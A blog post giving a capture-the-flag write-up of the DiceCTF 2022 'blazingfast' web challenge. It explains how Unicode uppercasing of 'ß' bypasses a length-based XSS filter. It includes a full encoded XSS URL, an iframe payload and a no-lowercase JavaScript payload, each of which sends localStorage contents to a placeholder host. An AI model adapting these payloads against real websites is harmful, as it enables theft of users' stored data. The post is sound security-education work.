@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8" />
+<title>blazingfast</title>
+
+<meta name="author" content="betaveros" />
+<meta name="description" content="Last weekend Galhacktic Trendsetters sort of spontaneously decided to do DiceCTF 2022, months or years after most of us had done another CTF. It was a lot of fun and we placed 6th!
+ I made a blazing fast MoCkInG CaSe converter!
+blazingfast.mc.ax
+ We’re presented with a website that converts text to AlTeRnAtInG CaSe. The core converter is written in WASM, and also checks that its input doesn’t have any of the characters &amp;lt;&amp;gt;&amp;amp;&#34;. The JavaScript wrapper takes an input from the URL, converts it to uppercase, feeds it to the converter, and if the check passes, injects the output into an innerHTML. The goal is to compose a URL that, when visited by an admin bot, leaks the flag from localStorage.
+The converter is compiled from this C code:
+int length, ptr = 0; char buf[1000];  void init(int size) { length = size; ptr = 0; }  char read() { return buf[ptr&#43;&#43;]; }  void write(char c) { buf[ptr&#43;&#43;] = c; }  int mock() { for (int i = 0; i &amp;lt; length; i &#43;&#43;) { if (i % 2 == 1 &amp;amp;&amp;amp; buf[i] &amp;gt;= 65 &amp;amp;&amp;amp; buf[i] &amp;lt;= 90) { buf[i] &#43;= 32; }  if (buf[i] == &amp;#39;&amp;lt;&amp;#39; || buf[i] == &amp;#39;&amp;gt;&amp;#39; || buf[i] == &amp;#39;&amp;amp;&amp;#39; || buf[i] == &amp;#39;&amp;quot;&amp;#39;) { return 1; } }  ptr = 0;  return 0; }" /><meta name="generator" content="Hugo 0.88.0-DEV" />
+
+<link rel="canonical" href="//blog.vero.site/post/blazingfast" />
+<link rel="alternative" href="/index.xml" title="Bounded-Error Log" type="application/atom+xml" />
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta name="format-detection" content="telephone=no,email=no,adress=no" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+
+<meta name="robots" content="index,follow" />
+<meta name="referrer" content="origin-when-cross-origin" />
+<meta name="theme-color" content="#330000" />
+<meta name="twitter:creator" content="@betaveros">
+
+<link rel="icon" href="/favicon.ico" />
+
+<link rel="stylesheet" href="/css/bundle.css" />
+<link rel="stylesheet" href="/katex/katex.min.css" />
+
+<!--[if lte IE 11]>
+    <script src="//cdn.bootcss.com/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+</head>
+<body><div id="wrapper">
+<header class="site-header"><h2 class="title"><a href="/">Bounded-Error Log</a></h2><p class="subtitle">theoretical and applied randomness by <a href="https://beta.vero.site/">betaveros</a></p>
+<button class="menu-toggle" type="button" aria-label="Toggle Menu">
+	<span class="icon icon-menu" aria-hidden="true"></span>
+</button>
+<nav class="site-menu collapsed">
+	<h2 class="offscreen">Main Menu</h2>
+	<ul class="menu-list"><li class="menu-item "><a href="/about">About</a></li><li class="menu-item "><a href="/category/life">Life</a></li><li class="menu-item "><a href="/category/thoughts">Thoughts</a></li><li class="menu-item "><a href="/category/self-analysis">Self-Analysis</a></li><li class="menu-item "><a href="/category/math">Math</a></li><li class="menu-item "><a href="/category/cs">CS</a></li><li class="menu-item "><a href="/category/puzzles">Puzzles</a></li><li class="menu-item "><a href="/category/meta">Meta</a></li><li class="menu-item "><a href="/ref">References</a></li><li class="menu-item "><a href="/util">Utilities</a></li><li class="menu-item "><a href="/all">All Posts</a></li></ul>
+</nav>
+<nav class="social-menu collapsed">
+	<h2 class="offscreen">Social Networks</h2>
+	<ul class="social-list"><li class="social-item">
+			<a href="//github.com/betaveros" title="GitHub" aria-label="GitHub"><span class="icon icon-github" aria-hidden="true"></span></a>
+
+		</li><li class="social-item">
+			<a href="/index.xml" title="RSS" aria-label="RSS"><span class="icon icon-rss" aria-hidden="true"></span></a>
+		</li>
+	</ul>
+</nav>
+</header>
+
+<section class="main post-detail">
+	<header>
+		<h1 class="post-title">blazingfast</h1>
+		
+		<h2 class="post-subtitle">DiceCTF 2022 (Web, 140 pts)</h2>
+		
+		<p class="post-meta">
+		
+		2022-02-14
+		(1404 words)
+		
+		<span class="post-categories">
+			filed under
+			<a href="/category/cs">CS</a>
+		</span>
+		
+		</p>
+	</header>
+	<article><p>Last weekend <a href="https://galhacktictrendsetters.wordpress.com/">Galhacktic Trendsetters</a> sort of spontaneously decided to do <a href="https://ctf.dicega.ng/">DiceCTF 2022</a>, months or years after most of us had done another CTF. It was a lot of fun and we placed 6th!</p>
+<blockquote>
+<p>I made a blazing fast MoCkInG CaSe converter!</p>
+<p>blazingfast.mc.ax</p>
+</blockquote>
+<p>We’re presented with a website that converts text to AlTeRnAtInG CaSe. The core converter is written in WASM, and also checks that its input doesn’t have any of the characters <code>&lt;&gt;&amp;"</code>. The JavaScript wrapper takes an input from the URL, converts it to uppercase, feeds it to the converter, and if the check passes, injects the output into an <code>innerHTML</code>. The goal is to compose a URL that, when visited by an admin bot, leaks the flag from <code>localStorage</code>.</p>
+<p>The converter is compiled from this C code:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb1-1" title="1"><span class="dt">int</span> length, ptr = <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb1-2" title="2"><span class="dt">char</span> buf[<span class="dv">1000</span>];</a>
+<a class="sourceLine" id="cb1-3" title="3"></a>
+<a class="sourceLine" id="cb1-4" title="4"><span class="dt">void</span> init(<span class="dt">int</span> size) {</a>
+<a class="sourceLine" id="cb1-5" title="5">    length = size;</a>
+<a class="sourceLine" id="cb1-6" title="6">    ptr = <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb1-7" title="7">}</a>
+<a class="sourceLine" id="cb1-8" title="8"></a>
+<a class="sourceLine" id="cb1-9" title="9"><span class="dt">char</span> read() {</a>
+<a class="sourceLine" id="cb1-10" title="10">    <span class="cf">return</span> buf[ptr++];</a>
+<a class="sourceLine" id="cb1-11" title="11">}</a>
+<a class="sourceLine" id="cb1-12" title="12"></a>
+<a class="sourceLine" id="cb1-13" title="13"><span class="dt">void</span> write(<span class="dt">char</span> c) {</a>
+<a class="sourceLine" id="cb1-14" title="14">    buf[ptr++] = c;</a>
+<a class="sourceLine" id="cb1-15" title="15">}</a>
+<a class="sourceLine" id="cb1-16" title="16"></a>
+<a class="sourceLine" id="cb1-17" title="17"><span class="dt">int</span> mock() {</a>
+<a class="sourceLine" id="cb1-18" title="18">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; length; i ++) {</a>
+<a class="sourceLine" id="cb1-19" title="19">        <span class="cf">if</span> (i % <span class="dv">2</span> == <span class="dv">1</span> &amp;&amp; buf[i] &gt;= <span class="dv">65</span> &amp;&amp; buf[i] &lt;= <span class="dv">90</span>) {</a>
+<a class="sourceLine" id="cb1-20" title="20">            buf[i] += <span class="dv">32</span>;</a>
+<a class="sourceLine" id="cb1-21" title="21">        }</a>
+<a class="sourceLine" id="cb1-22" title="22"></a>
+<a class="sourceLine" id="cb1-23" title="23">        <span class="cf">if</span> (buf[i] == <span class="ch">&#39;&lt;&#39;</span> || buf[i] == <span class="ch">&#39;&gt;&#39;</span> || buf[i] == <span class="ch">&#39;&amp;&#39;</span> || buf[i] == <span class="ch">&#39;&quot;&#39;</span>) {</a>
+<a class="sourceLine" id="cb1-24" title="24">            <span class="cf">return</span> <span class="dv">1</span>;</a>
+<a class="sourceLine" id="cb1-25" title="25">        }</a>
+<a class="sourceLine" id="cb1-26" title="26">    }</a>
+<a class="sourceLine" id="cb1-27" title="27"></a>
+<a class="sourceLine" id="cb1-28" title="28">    ptr = <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb1-29" title="29"></a>
+<a class="sourceLine" id="cb1-30" title="30">    <span class="cf">return</span> <span class="dv">0</span>;</a>
+<a class="sourceLine" id="cb1-31" title="31">}</a></code></pre></div>
+<p>The most important part of the site’s JavaScript is as follows:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb2-1" title="1"><span class="kw">function</span> <span class="at">mock</span>(str) <span class="op">{</span></a>
+<a class="sourceLine" id="cb2-2" title="2">    <span class="va">blazingfast</span>.<span class="at">init</span>(<span class="va">str</span>.<span class="at">length</span>)<span class="op">;</span></a>
+<a class="sourceLine" id="cb2-3" title="3"></a>
+<a class="sourceLine" id="cb2-4" title="4">    <span class="cf">if</span> (<span class="va">str</span>.<span class="at">length</span> <span class="op">&gt;=</span> <span class="dv">1000</span>) <span class="cf">return</span> <span class="st">&#39;Too long!&#39;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb2-5" title="5"></a>
+<a class="sourceLine" id="cb2-6" title="6">    <span class="cf">for</span> (<span class="kw">let</span> c <span class="kw">of</span> <span class="va">str</span>.<span class="at">toUpperCase</span>()) <span class="op">{</span></a>
+<a class="sourceLine" id="cb2-7" title="7">        <span class="cf">if</span> (<span class="va">c</span>.<span class="at">charCodeAt</span>(<span class="dv">0</span>) <span class="op">&gt;</span> <span class="dv">128</span>) <span class="cf">return</span> <span class="st">&#39;Nice try.&#39;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb2-8" title="8">        <span class="va">blazingfast</span>.<span class="at">write</span>(<span class="va">c</span>.<span class="at">charCodeAt</span>(<span class="dv">0</span>))<span class="op">;</span></a>
+<a class="sourceLine" id="cb2-9" title="9">    <span class="op">}</span></a>
+<a class="sourceLine" id="cb2-10" title="10"></a>
+<a class="sourceLine" id="cb2-11" title="11">    <span class="cf">if</span> (<span class="va">blazingfast</span>.<span class="at">mock</span>() <span class="op">==</span> <span class="dv">1</span>) <span class="op">{</span></a>
+<a class="sourceLine" id="cb2-12" title="12">        <span class="cf">return</span> <span class="st">&#39;No XSS for you!&#39;</span><span class="op">;</span></a>
+<a class="sourceLine" id="cb2-13" title="13">    <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></a>
+<a class="sourceLine" id="cb2-14" title="14">        <span class="kw">let</span> mocking <span class="op">=</span> <span class="st">&#39;&#39;</span><span class="op">,</span> buf <span class="op">=</span> <span class="va">blazingfast</span>.<span class="at">read</span>()<span class="op">;</span></a>
+<a class="sourceLine" id="cb2-15" title="15"></a>
+<a class="sourceLine" id="cb2-16" title="16">        <span class="cf">while</span>(buf <span class="op">!=</span> <span class="dv">0</span>) <span class="op">{</span></a>
+<a class="sourceLine" id="cb2-17" title="17">            mocking <span class="op">+=</span> <span class="va">String</span>.<span class="at">fromCharCode</span>(buf)<span class="op">;</span></a>
+<a class="sourceLine" id="cb2-18" title="18">            buf <span class="op">=</span> <span class="va">blazingfast</span>.<span class="at">read</span>()<span class="op">;</span></a>
+<a class="sourceLine" id="cb2-19" title="19">        <span class="op">}</span></a>
+<a class="sourceLine" id="cb2-20" title="20"></a>
+<a class="sourceLine" id="cb2-21" title="21">        <span class="cf">return</span> mocking<span class="op">;</span></a>
+<a class="sourceLine" id="cb2-22" title="22">    <span class="op">}</span></a>
+<a class="sourceLine" id="cb2-23" title="23"><span class="op">}</span></a>
+<a class="sourceLine" id="cb2-24" title="24"></a>
+<a class="sourceLine" id="cb2-25" title="25"><span class="kw">function</span> <span class="at">demo</span>(str) <span class="op">{</span></a>
+<a class="sourceLine" id="cb2-26" title="26">    <span class="va">document</span>.<span class="at">getElementById</span>(<span class="st">&#39;result&#39;</span>).<span class="at">innerHTML</span> <span class="op">=</span> <span class="at">mock</span>(str)<span class="op">;</span></a>
+<a class="sourceLine" id="cb2-27" title="27"><span class="op">}</span></a></code></pre></div>
+<p>An overview of the logic:</p>
+<ol type="1">
+<li>First, the JavaScript passes the input’s <code>length</code> into the converter and checks that that length is at most 1000.</li>
+<li>Then, it converts the input <code>toUpperCase</code> and writes it character by character into the converter, checking that none of those characters are greater than 128.</li>
+<li>Next, it calls the converter, which converts the case of the first <code>length</code> chars of its buffer, as well as checking for XSS.</li>
+<li>Finally, the JavaScript reads the output back until it sees a null byte, and injects that into <code>innerHTML</code>.</li>
+</ol>
+<p>Although an <code>innerHTML</code> injection is very powerful, we can’t directly inject any HTML tags because the converter checks for <code>&lt;</code>. We need to get around this check somehow. The handling of the input and output’s length, and in particular the way the output is read until a null byte, is quite suspicious: the string that we compute the length of and the string that we eventually write aren’t the same.</p>
+<p>And indeed, the core exploit in this challenge is that <strong>converting a string to uppercase does not preserve its length</strong>. The simplest example of this I used is U+00DF “ß”, the German eszett, which is one character but which gets uppercased into two, “SS” — furthermore, both of them are ASCII characters. There are a few other examples; I think <a href="https://www.unicode.org/Public/UCD/latest/ucd/SpecialCasing.txt">SpecialCasing.txt</a> from the <a href="https://www.unicode.org/ucd/">Unicode Character Database</a> is the authoritative source. (Notably, U+FB03 “ﬃ” and U+FB04 “ﬄ” each get uppercased into <em>three</em> letters, which gives us more room to write our exploit if we want it, as I explain below.)</p>
+<p>What a character like this enables us to do is: if we pad our input with many ß’s at the beginning, then the <code>length</code> received by the converter will be much shorter than the “true length” of the uppercased string that the converter eventually receives. The converter will then only check for the XSS characters in the first <code>length</code> characters (while case-converting them). However, because the JS wrapper reads until it sees a null byte, it will read the entire string back out. So we can sneak an XSS in the part after the first <code>length</code> characters.</p>
+<p>There were a few more complications, all of them relatively minor, but they still took me an hour or two to sort out. One of them was the rather newbie realization that I had never actually set up a public-facing web server to exfiltrate a flag from a CTF before. (The only other CTF challenge I’ve done involving exfiltration from a browser, <a href="https://blog.vero.site/post/cat-chat">Cat Chat</a>, provided its own exfiltration mechanism.) But I do have a cheap Linode server now, so I copy-pasted one of my nginx config lines to <a href="https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/">reverse proxy</a> a path to a specific port and ran <code>nc -l</code> on that port as needed.</p>
+<p>The next complication is that a <code>&lt;script&gt;</code> tag injected via <code>innerHTML</code> does not execute. This is so well-documented that it appears in <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations">MDN’s docs for innerHTML</a>. Happily, that page also includes an alternative exploit that does work: <code>&lt;img src='x' onerror='code'&gt;</code>.</p>
+<p>However, there is a final overlapping complication: our XSS gets passed through <code>.toUpperCase()</code>, so it can’t contain any lowercase letters! If the <code>&lt;script&gt;</code> exploit had worked, we could have sourced an external JavaScript file whose URL doesn’t contain lowercase letters. However, the <code>&lt;img onerror&gt;</code> exploit requires us to write JavaScript inline, which is a bit more painful. I did find a writeup of an <a href="https://amalmurali47.medium.com/solving-intigriti-challenge-using-content-injection-84e212cae00f">Intigriti Challenge by Amal Murali</a> that mentioned an <code>&lt;iframe srcdoc&gt;</code> exploit along these lines:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode html"><code class="sourceCode html"><a class="sourceLine" id="cb3-1" title="1"><span class="kw">&lt;IFRAME</span><span class="ot"> SRCDOC=</span><span class="st">&quot;</span><span class="er">&lt;</span><span class="st">SCRIPT SRC=&#39;HTTPS://EXAMPLE.COM/EXPLOIT.JS&#39;&gt;</span><span class="er">&lt;</span><span class="st">/SCRIPT&gt;&quot;</span><span class="kw">&gt;&lt;/IFRAME&gt;</span></a></code></pre></div>
+<p>Unfortunately, although this exploit worked “locally” for me, it didn’t when I pasted it into the bot.</p>
+<p>I got stuck here for a bit. I tried for a while to write an exploit without any lowercase letters; I knew it was possible a la <a href="http://www.jsfuck.com/">JSFuck</a>, but I wasn’t sure if I could also satisfy the length constraint of about 500 characters (which could have become 666 with if I had known about ﬃ or ﬄ). But eventually I talked to my teammates and cesium pointed out that I could replace every lowercase letter with an ampersand escape (<a href="https://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references">“character references”</a>) in my exploit, which would get unescaped when they were injected into innerHTML and interpreted as an attribute.</p>
+<p>As a final tiny obstacle, it took some effort to percent encode everything properly. While for many Unicode characters you can get percent encoding for free by pasting them into a browser’s URL bar and then copying them out again, both the <code>&amp;</code> and the <code>#</code> in the ampersand escape have other meanings in URLs and need to be manually encoded, as does <code>+</code> because <code>URLSearchParams</code> parses it as a space.</p>
+<p>In any case, we no longer have any restrictions and can just write straightforward JavaScript and then escape it. If we take <code>&lt;IMG SRC=X ONERROR='fetch("HTTPS://EXAMPLE.COM/"+localStorage.getItem("flag"))'&gt;</code>, prepend lots of ß’s, and encode properly, we end up with a final working exploit (replace <code>EXAMPLE.COM</code> with your exfiltration website):</p>
+<p><code>https://blazingfast.mc.ax/?demo=%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%C3%9F%3CIMG%20SRC=X%20ONERROR=%22%26%23119;%26%23105;%26%23110;%26%23100;%26%23111;%26%23119;.%26%23102;%26%23101;%26%23116;%26%2399;%26%23104;(%27HTTPS://EXAMPLE.COM/%27%2B%26%23108;%26%23111;%26%2399;%26%2397;%26%23108;S%26%23116;%26%23111;%26%23114;%26%2397;%26%23103;%26%23101;.%26%23103;%26%23101;%26%23116;I%26%23116;%26%23101;%26%23109;(%27%26%23102;%26%23108;%26%2397;%26%23103;%27));%22%3E</code></p>
+<figure>
+<a href="/img/blazingfast-exfiltrate.png"><img src="/img/blazingfast-exfiltrate.png" alt="Not depicted: parallel parking where disallowed (600~1,200)"/></a>
+<figcaption>
+Leaking the flag from my cheap Linode server
+</figcaption>
+</figure>
+<p>For my own reference next time, <a href="https://webhook.site/">webhook.site</a> seems to be a popular tool for free exfiltration endpoints. And maybe <a href="https://ngrok.com/">ngrok</a> offers a bit more flexibility for a bit more setup, but still doesn’t require setting up a server.</p>
+<h3 id="appendix-the-no-lowercase-letters-strategy">Appendix: The no-lowercase-letters strategy</h3>
+<p>After solving this challenge and becoming stuck on everything else, I went back and finished the JSFuck approach of writing an exploit without any lowercase letters. The character limit was not as harsh as I feared, since I had a full uppercase alphabet of variables, and adapting bits and pieces of the <a href="https://github.com/aemkei/jsfuck/blob/master/jsfuck.js">JSFuck source code</a> was fairly intuitive.</p>
+<p>Here’s a lightly commented version of the JavaScript without any lowercase letters I ended up with that will exfiltrate the flag from <code>localStorage</code>:</p>
+<div class="sourceCode" id="cb4"><pre class="sourceCode js"><code class="sourceCode javascript"><a class="sourceLine" id="cb4-1" title="1">X<span class="op">=</span><span class="st">&quot;&quot;</span><span class="op">+{};</span>   <span class="co">// &quot;[object Object]&quot;</span></a>
+<a class="sourceLine" id="cb4-2" title="2">Y<span class="op">=</span><span class="st">&quot;&quot;</span><span class="op">+!</span><span class="dv">1</span><span class="op">;</span>   <span class="co">// &quot;false&quot;</span></a>
+<a class="sourceLine" id="cb4-3" title="3">Z<span class="op">=</span><span class="st">&quot;&quot;</span><span class="op">+</span><span class="dv">0</span>[<span class="dv">0</span>]<span class="op">;</span> <span class="co">// &quot;undefined&quot;</span></a>
+<a class="sourceLine" id="cb4-4" title="4"></a>
+<a class="sourceLine" id="cb4-5" title="5">A<span class="op">=</span>Y[<span class="dv">1</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-6" title="6">C<span class="op">=</span>X[<span class="dv">5</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-7" title="7">E<span class="op">=</span>Y[<span class="dv">4</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-8" title="8">F<span class="op">=</span>Y[<span class="dv">0</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-9" title="9">I<span class="op">=</span>Z[<span class="dv">5</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-10" title="10">L<span class="op">=</span>Y[<span class="dv">2</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-11" title="11">N<span class="op">=</span>Z[<span class="dv">1</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-12" title="12">O<span class="op">=</span>X[<span class="dv">1</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-13" title="13">R<span class="op">=</span>(<span class="st">&quot;&quot;</span><span class="op">+!</span><span class="dv">0</span>)[<span class="dv">1</span>]<span class="op">;</span> <span class="co">// &quot;true&quot;[1]</span></a>
+<a class="sourceLine" id="cb4-14" title="14">S<span class="op">=</span>Y[<span class="dv">3</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-15" title="15">T<span class="op">=</span>X[<span class="dv">6</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-16" title="16">U<span class="op">=</span>Z[<span class="dv">0</span>]<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-17" title="17"></a>
+<a class="sourceLine" id="cb4-18" title="18">CTR<span class="op">=</span>C<span class="op">+</span>O<span class="op">+</span>N<span class="op">+</span>S<span class="op">+</span>T<span class="op">+</span>R<span class="op">+</span>U<span class="op">+</span>C<span class="op">+</span>T<span class="op">+</span>O<span class="op">+</span>R<span class="op">;</span></a>
+<a class="sourceLine" id="cb4-19" title="19"></a>
+<a class="sourceLine" id="cb4-20" title="20">G<span class="op">=</span>(<span class="st">&quot;&quot;</span><span class="op">+</span><span class="st">&quot;&quot;</span>[CTR])[<span class="dv">14</span>]<span class="op">;</span> <span class="co">// &quot;function String() { [native code] }&quot;[14]</span></a>
+<a class="sourceLine" id="cb4-21" title="21">M<span class="op">=</span>(<span class="st">&quot;&quot;</span><span class="op">+</span><span class="dv">0</span>[CTR])[<span class="dv">11</span>]<span class="op">;</span>  <span class="co">// &quot;function Number() { [native code] }&quot;[11]</span></a>
+<a class="sourceLine" id="cb4-22" title="22">H<span class="op">=</span><span class="dv">17</span>[T<span class="op">+</span>O<span class="op">+</span><span class="st">&quot;&quot;</span>[CTR][N<span class="op">+</span>A<span class="op">+</span>M<span class="op">+</span>E]](<span class="dv">18</span>)<span class="op">;</span> <span class="co">// (17).toString(18), i.e. 17 in base 18</span></a>
+<a class="sourceLine" id="cb4-23" title="23"></a>
+<a class="sourceLine" id="cb4-24" title="24">[][F<span class="op">+</span>L<span class="op">+</span>A<span class="op">+</span>T][CTR](F<span class="op">+</span>E<span class="op">+</span>T<span class="op">+</span>C<span class="op">+</span>H<span class="op">+</span><span class="st">&quot;(</span><span class="sc">\&quot;</span><span class="st">HTTPS://EXAMPLE.COM/</span><span class="sc">\&quot;</span><span class="st">+&quot;</span><span class="op">+</span>L<span class="op">+</span>O<span class="op">+</span>C<span class="op">+</span>A<span class="op">+</span>L<span class="op">+</span><span class="st">&quot;S&quot;</span><span class="op">+</span>T<span class="op">+</span>O<span class="op">+</span>R<span class="op">+</span>A<span class="op">+</span>G<span class="op">+</span>E<span class="op">+</span><span class="st">&quot;.&quot;</span><span class="op">+</span>G<span class="op">+</span>E<span class="op">+</span>T<span class="op">+</span><span class="st">&quot;I&quot;</span><span class="op">+</span>T<span class="op">+</span>E<span class="op">+</span>M<span class="op">+</span><span class="st">&quot;(</span><span class="sc">\&quot;</span><span class="st">&quot;</span><span class="op">+</span>F<span class="op">+</span>L<span class="op">+</span>A<span class="op">+</span>G<span class="op">+</span><span class="st">&quot;</span><span class="sc">\&quot;</span><span class="st">))&quot;</span>)()</a></code></pre></div>
+<p>The exploit can be produced in the same way: putting it in <code>&lt;img src=x onerror='...'&gt;</code> and padding with ß’s. After deleting all the comments and whitespace, the code above is about 330 characters, and there are many ways to shave a few more off (renaming <code>CTR</code>, replacing most <code>""</code>s with a variable… there was actually no need to go through <code>[][F+L+A+T]</code> to get a function when <code>(_=&gt;_)</code> would have sufficed), so there’s plenty of room to spare.</p>
+<p>After the CTF, I was somewhat relieved to see that <a href="https://smitop.com/p/dctf22-blazingfast/">Smitop’s writeup</a> also took this approach, which means I wasn’t the only one who didn’t think of using ampersand escapes.</p></article>
+	<footer class="post-footer">
+		
+		<ul class="post-tags">
+			
+			<li><a href="/tag/ctf"><span class="tag">CTF</span></a></li>
+			
+		</ul>
+		
+	</footer>
+	<script data-isso="//node.vero.site/isso/" data-isso-css="false" src="//node.vero.site/isso/js/embed.min.js"></script>
+	<section id="isso-thread"></section>
+	<p class="comments-meta">(note: the commenting setup here is experimental and I may not check my comments often; if you want to tell <em>me</em> something instead of the world, email me!)</p>
+	
+	
+	
+	<footer class="post-footer">
+		<nav class="pagination">
+			
+			<a class="pagination-previous" href="//blog.vero.site/post/2022-hunt">← 2022 MIT Mystery Hunt</a>
+			
+			
+			<a class="pagination-next" href="//blog.vero.site/post/ti1337se">TI-1337 Silver Edition →</a>
+			
+		</nav>
+	</footer>
+</section>
+<footer class="site-footer">
+	<p>© 2017-2022 betaveros, Bounded-Error Log</p>
+	<a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="//i.creativecommons.org/l/by-sa/4.0/88x31.png" /></a><br />Except where otherwise noted, content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+	<p>Powered by <a href="https://gohugo.io/">Hugo</a>, <a href="http://pandoc.org/">pandoc</a>,
+	<a href="https://www.goatcounter.com/">GoatCounter</a>,
+	<a href="https://posativ.org/isso/">Isso</a>,
+	<a href="https://pages.github.com/">GitHub Pages</a>, and
+	<a href="https://www.cloudflare.com/">CloudFlare</a>.
+	</p>
+	<p>Opinions are mine and not of any employer, past or present.</p>
+</footer>
+
+<script src="/katex/katex.min.js"></script>
+<script src="/katex/contrib/auto-render.min.js"></script>
+<script>renderMathInElement(document.body);</script>
+<script src="/js/bundle.js"></script>
+<script>window.goatcounter = { path: function(p) { return '/blog' + p; } }</script>
+<script data-goatcounter="https://node.vero.site:8073/count" async src="https://node.vero.site:8073/count.js"></script>
+<script src="/js/jquery-3.2.1.min.js"></script>
+
+
+</div></body>
+</html>
